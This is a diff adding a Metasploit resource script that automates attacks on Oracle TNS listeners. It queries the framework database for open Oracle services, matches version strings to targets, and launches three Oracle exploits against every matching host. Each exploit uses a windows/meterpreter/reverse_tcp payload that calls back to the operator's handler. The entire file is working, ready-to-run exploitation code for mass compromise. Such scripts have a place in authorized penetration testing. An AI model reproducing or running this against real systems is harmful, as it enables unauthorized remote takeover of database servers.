@@ -1,0 +1,81 @@
+<ruby>
+# oracle_sploit.rc
+# Author: nebulus
+
+
+puts "This script uses a payload of windows/meterpreter/reverse_tcp and ASSUMES:\n\t1) LHOST/LPORT already set 'setg LHOST <YOUR IP>' and 'setg LPORT <YOUR PORT>'"
+puts "\t2) Connection to the backend database already established"
+sleep 2					# give them a second to think about it
+
+# Currently tested targets
+#   exploit/windows/oracle/tns_arguments                                   Oracle 8.1.7.0.0 Standard Edition (Windows 2000)
+#    exploit/windows/oracle/tns_arguments                                   Oracle 8.1.7.0.0 Standard Edition (Windows 2003)
+#    exploit/windows/oracle/tns_auth_sesskey                                Oracle 10.2.0.1.0 Enterprise Edition
+#    exploit/windows/oracle/tns_auth_sesskey                                Oracle 10.2.0.4.0 Enterprise Edition
+#    exploit/windows/oracle/tns_service_name                                Oracle 8.1.7.0.0 Standard Edition (Windows 2000)
+#    exploit/windows/oracle/tns_service_name                                Oracle 8.1.7.0.0 Standard Edition (Windows 2003)
+
+self.run_single('use exploit/multi/handler')
+self.run_single('set PAYLOAD windows/meterpreter/reverse_tcp')
+self.run_single('setg ExitOnSession false')
+self.run_single('exploit -j')
+
+sploits = {'exploit/windows/oracle/tns_auth_sesskey' => [], 'exploit/windows/oracle/tns_arguments' => [], 'exploit/windows/oracle/tns_service_name' => []}
+
+
+hosts = []
+framework.db.services.each do |service|
+#	puts service.inspect
+	if ( (service.port == 1521 or service.port == 1522 or service.port == 1526) and (service.name =~ /oracle/i) and service.state == 'open')
+		if(service.info =~ /windows: version 10.2.0.1.0/i or (service.info =~ /Oracle TNS Listener 10.2.0.1.0 \(for 32-bit Windows\)/) )
+			sploits['exploit/windows/oracle/tns_auth_sesskey'].push({'port' => service.port, 'ip' => service.host.address, 'target' => '1'})
+		elsif(service.info =~ /windows: version 10.2.0.4.0/i or (service.info =~ /Oracle TNS Listener 10.2.0.4.0 \(for 32-bit Windows\)/) )
+			sploits['exploit/windows/oracle/tns_auth_sesskey'].push({'port' => service.port, 'ip' => service.host.address, 'target' => '2'})
+		elsif(service.info =~ /windows: version 8.1.7.0.0/i or (service.info =~ /Oracle TNS Listener 8.1.7.0.0 \(for 32-bit Windows\)/) )
+			sploits['exploit/windows/oracle/tns_arguments'].push({'port' => service.port, 'ip' => service.host.address, 'target' => '1'})
+			sploits['exploit/windows/oracle/tns_service_name'].push({'port' => service.port, 'ip' => service.host.address, 'target' => '1'})
+		end
+	end
+end
+
+
+if(sploits['exploit/windows/oracle/tns_auth_sesskey'].length > 0)
+	sploits['exploit/windows/oracle/tns_auth_sesskey'].each do |v|
+		self.run_single("use exploit/windows/oracle/tns_auth_sesskey")
+		self.run_single('set PAYLOAD windows/meterpreter/reverse_tcp')
+		self.run_single('set DisablePayloadHandler true')
+		self.run_single("set RHOST #{v['ip']}")
+		self.run_single("set RPORT #{v['port']}")
+		self.run_single("set TARGET #{v['target']}")
+		self.run_single('exploit')
+	end
+end
+
+if(sploits['exploit/windows/oracle/tns_arguments'].length > 0)
+	sploits['exploit/windows/oracle/tns_arguments'].each do |v|
+		self.run_single("use exploit/windows/oracle/tns_arguments")
+		self.run_single('set PAYLOAD windows/meterpreter/reverse_tcp')
+		self.run_single('set DisablePayloadHandler true')
+		self.run_single("set RHOST #{v['ip']}")
+		self.run_single("set RPORT #{v['port']}")
+		self.run_single("set TARGET #{v['target']}")
+		self.run_single('exploit')
+	end
+
+end
+
+if(sploits['exploit/windows/oracle/tns_service_name'].length > 0)
+	sploits['exploit/windows/oracle/tns_service_name'].each do |v|
+		self.run_single("use exploit/windows/oracle/tns_service_name")
+		self.run_single('set PAYLOAD windows/meterpreter/reverse_tcp')
+		self.run_single('set DisablePayloadHandler true')
+		self.run_single("set RHOST #{v['ip']}")
+		self.run_single("set RPORT #{v['port']}")
+		self.run_single("set TARGET #{v['target']}")
+		self.run_single('exploit')
+	end
+
+end
+puts "Don't forget to stop your payload handler..."
+</ruby>
+
